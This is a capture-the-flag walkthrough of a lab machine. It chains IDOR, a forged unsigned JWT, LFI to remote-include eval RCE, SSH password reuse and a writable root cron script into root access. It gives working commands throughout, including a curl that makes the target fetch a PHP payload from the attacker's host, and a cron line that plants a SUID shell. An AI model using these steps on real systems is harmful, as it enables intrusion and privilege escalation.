# Domino — Walkthrough

Oct 22, 2026 · @Will

Chain five vulnerabilities — IDOR, forged JWT, LFI/RFI, credential reuse, writable cron script — from anonymous visitor to root on 10.145.166.57.

## Attack chain at a glance

Five vulnerabilities chained from unauthenticated recon to a root shell.

| Step | Technique | Gain |
| --- | --- | --- |
| 1 | User enumeration via `team.php` + `/forgot.php` | Valid credentials (robert.wilson / password) |
| 2 | IDOR on `/api/users/profile.php?id=` | Flag 1 — admin profile data |
| 3 | Forged JWT (`role:admin`, sig check disabled) via `/api/auth/token.php` | Admin session; Flag 2 in `/admin/index.php` source |
| 4 | LFI on `/api/files.php` → source disclosure of `config.php` + `files.php` → RFI `eval()` | RCE as www-data; Flag 3 |
| 5 | DB password `D3v0ps!2024` reused as SSH credential for `devops` | Lateral move; Flag 4 |
| 6 | Writable `/opt/monitoring/health_report.sh` executed as UID=0 every minute | Root shell; Flag 5 |

**Key secrets recovered**

- `JWT_SECRET`: `nexus_jwt_s3cr3t_2024` (unused — sig check disabled)
- `APP_SECRET`: `nexus_app_k3y_2024`
- `DB_PASS` / SSH password: `D3v0ps!2024`
- AES-128-ECB backup key: `N3xusK3y2024!!` (from `static/app.js`, extracted via `xxd`)

## Flag 1 — IDOR on the profile API

**Flag:** `THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}`

### Recon and user enumeration

`/team.php` lists seven NexusCorp employees with full names. Every email on the page follows `firstname.lastname@nexuscorp.com`, revealing the username convention.

The password-reset form at `/forgot.php` leaks whether an account exists: a valid username returns a masked email (`r*****@nexuscorp.com`), an invalid one returns "No account found." Testing each name from `team.php` confirms valid accounts. `admin` returns no match, so the admin account uses a different identifier.

```bash
curl -s -X POST http://10.145.166.57/forgot.php \
  -d 'username=robert.wilson' | grep -i 'email\|account'
# → r*****@nexuscorp.com (valid)
```

### Login and IDOR

Using `robert.wilson` / `password` against the API login endpoint returns a `nexus_session` cookie — a raw base64-encoded JSON blob with no HMAC:

```bash
curl -s -X POST http://10.145.166.57/api/login.php \
  -d 'username=robert.wilson&password=password'
# nexus_session=eyJ1c2VyX2lkIjo0LCJ1c2VybmFtZSI6InJvYmVydC53aWxzb24iLCJyb2xlIjoidXNlciJ9
```

Decoded: `{"user_id":4,"username":"robert.wilson","role":"user"}`

The dashboard source reveals the profile link: `/api/users/profile.php?id=4`. Changing `id=1` returns the admin profile, including Flag 1:

```bash
curl -s 'http://10.145.166.57/api/users/profile.php?id=1' \
  -H 'Cookie: nexus_session=<robert_session>'
# {"flag1":"THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}",...}
```

**Root cause:** The profile endpoint uses `?id=` from the query string with no ownership check — any authenticated user can request any user ID.

## Flag 2 — Forged JWT to admin panel

**Flag:** `THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}`

### Discovering the JWT endpoint

Gobuster on `/api/` reveals `/api/auth/token.php`. Posting the same credentials returns a signed JWT:

```bash
curl -s -X POST http://10.145.166.57/api/auth/token.php \
  -d 'username=robert.wilson&password=password'
# {"token":"eyJ....<header>.<payload>.<sig>"}
```

Decoding the payload: `{"user_id":4,"username":"robert.wilson","role":"user","exp":...}`. The `generate_jwt()` function in `auth.php` always hardcodes `role: "user"` regardless of the actual account role — a bug that prevents legitimate admins from getting an admin JWT.

### Disabled signature verification

Reading `auth.php` via LFI (see Flag 3 for the LFI technique) reveals that `verify_jwt()` has its signature check commented out:

```php
// Signature check intentionally disabled
// $expected = rtrim(base64_encode(
//   hash_hmac('sha256', "$parts[0].$parts[1]", JWT_SECRET, true)
// ),'=');
// if (!hash_equals($parts[2], $expected)) return null;
```

Any JWT with a future `exp` and `"role":"admin"` is accepted, regardless of signature.

### Forging the JWT

```bash
# Header
HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')

# Payload with role:admin
PAYLOAD=$(echo -n '{"user_id":1,"username":"admin","role":"admin","exp":9999999999}' \
  | base64 | tr '+/' '-_' | tr -d '=')

# Arbitrary signature (not checked)
SIG="fakesignature"

echo "$HEADER.$PAYLOAD.$SIG"
```

Sending this JWT to `/api/files.php` with `Authorization: Bearer <token>` grants admin access. LFI on `/var/www/html/admin/index.php` then exposes Flag 2, which is hardcoded in the PHP source:

```php
$flag2 = 'THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}';
```

**Root cause:** `verify_jwt()` has the HMAC check commented out, making the `JWT_SECRET` (`nexus_jwt_s3cr3t_2024`) irrelevant. A forged token with any signature passes.

## Flag 3 — LFI → source disclosure → RFI/eval RCE

**Flag:** `THM{rf1_2_rc3_f00th0ld_fl4g3}`

### LFI on `/api/files.php`

With the forged admin JWT, `/api/files.php?name=<path>` reads files inside `/var/www/html/`. The endpoint applies a `realpath()` check that restricts access to the webroot:

```bash
curl -s 'http://10.145.166.57/api/files.php?name=/var/www/html/config.php' \
  -H 'Authorization: Bearer <forged_jwt>'
```

**Files read and what they reveal:**

- `config.php` — `DB_PASS=D3v0ps!2024`, `JWT_SECRET`, `APP_SECRET`
- `auth.php` — disabled signature check (see Flag 2); cookie role fetched from DB, not the cookie
- `admin/index.php` — Flag 2 hardcoded
- `api/files.php` — **reveals the RFI vulnerability**

### Discovering RFI in `files.php` source

The LFI on `files.php` itself exposes the remote-fetch path:

```php
// RFI: fetch remote URL and eval as PHP
if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
    $remote = @file_get_contents($name);
    ob_start();
    eval(str_replace("<?php", "", $remote));
    $output = ob_get_clean();
    echo json_encode(["output" => $output]);
    exit;
}
```

If `name` starts with `http://`, the server fetches the URL and `eval()`s its content as PHP — unauthenticated RCE as `www-data`.

### Exploiting RFI for RCE

**1. Write a PHP payload on the attack box:**

```bash
cat > /tmp/shell.php << 'EOF'
<?php echo shell_exec("cat /opt/flag3.txt"); ?>
EOF
```

**2. Serve it:**

```bash
python3 -m http.server 8888 --directory /tmp &
```

**3. Trigger the RFI:**

```bash
curl -s "http://10.145.166.57/api/files.php?name=http://192.168.131.46:8888/shell.php" \
  -H 'Authorization: Bearer <forged_jwt>'
# {"output":"THM{rf1_2_rc3_f00th0ld_fl4g3}\n"}
```

**Notes:**

- The attack box IP (`192.168.131.46`) is the VPN interface (`tun0`), not the LAN IP.
- If the HTTP server has a cached response or a previous `shell.php` is still being served, kill and restart it before changing the payload.
- Changing the payload: `kill $(lsof -ti:8888) && sleep 1`, rewrite `/tmp/shell.php`, restart the server.

**Root cause:** `allow_url_fopen` is enabled and the `http://` prefix bypasses the `realpath()` webroot check entirely. The `eval()` call executes attacker-supplied PHP with no sandboxing.

## Flag 4 — SSH credential reuse

**Flag:** `THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}`

### Lateral move from www-data to devops

`config.php` (read via LFI) contains:

```php
define('DB_USER', 'app_user');
define('DB_PASS', 'D3v0ps!2024');
```

The decrypted backup config (`config.enc`, AES-128-ECB, key `N3xusK3y2024!!` from `static/app.js`) also reveals `"system_user":"devops"`. Testing the DB password as the SSH password for that user:

```bash
ssh devops@10.145.166.57
# Password: D3v0ps!2024
# devops@tryhackme-2404:~$
```

Flag 4 is in the home directory:

```bash
cat ~/user.txt
# THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
```

### Aside: decrypting `config.enc`

`/backup/` (found via gobuster) contains `README.txt` (documents AES-128-ECB encryption, references `static/app.js` for the key) and `config.enc` (binary). The key in `app.js` is null-byte-padded and invisible to `curl -s`; use `xxd` to extract it:

```bash
curl -s http://10.145.166.57/static/app.js | xxd | head -40
# reveals: _backupKey: 'N3xusK3y2024!!'
```

Pad to 16 bytes with `.`, then decrypt:

```bash
python3 -c "
from Crypto.Cipher import AES
import base64, sys
key = b'N3xusK3y2024!!..'
data = open('config.enc','rb').read()
cipher = AES.new(key, AES.MODE_ECB)
print(cipher.decrypt(data).rstrip(b'\x0b\x0c\r\x0e\x0f\x10').decode())
"
# {\"app_name\":\"NexusCorp Portal\",\"system_user\":\"devops\",...}
```

**Root cause:** The database password and the OS user password are identical, and the `devops` account has SSH enabled.

## Flag 5 — Writable cron script → root

**Flag:** `THM{pr1v3sc_cr0n_r00t_fl4g5}`

### Enumeration as devops

Standard checks come up empty: no `sudo` rights, no exploitable SUID binaries. `/opt/` holds two interesting items:

```
rwxrwxrwx /opt/admin_bot.py        # world-writable but already running
-rwxrwsr-x /opt/monitoring/health_report.sh  # group devops, owned root
```

`admin_bot.py` is world-writable but its process (PID 1096) is already loaded in memory — appending to the source file has no effect on the running interpreter. `health_report.sh` is the better path.

### Confirming cron execution with pspy64

```bash
/opt/tools/pspy64 2>/dev/null | head -30
# 2026/10/22 ... UID=0 ... /bin/bash /opt/monitoring/health_report.sh
```

UID=0 fires the script every minute. The `devops` group owns it with write permission (`rwxrwsr-x`).

### Escalation: SUID bash via cron

**1. Append a payload to the script:**

```bash
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' \
  >> /opt/monitoring/health_report.sh
```

**2. Wait up to one minute for cron to fire, then verify:**

```bash
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root ... /tmp/rootbash
```

**3. Spawn a root shell:**

```bash
/tmp/rootbash -p
# rootbash-5.2# id
# uid=1001(devops) gid=1001(devops) euid=0(root)
```

**4. Collect the flag:**

```bash
cat /root/root.txt
# THM{pr1v3sc_cr0n_r00t_fl4g5}
```

**Root cause:** `/opt/monitoring/health_report.sh` is owned by root and group-writable by `devops`, and cron executes it as UID=0 every minute with no integrity check. Any member of the `devops` group can inject arbitrary commands that run as root.
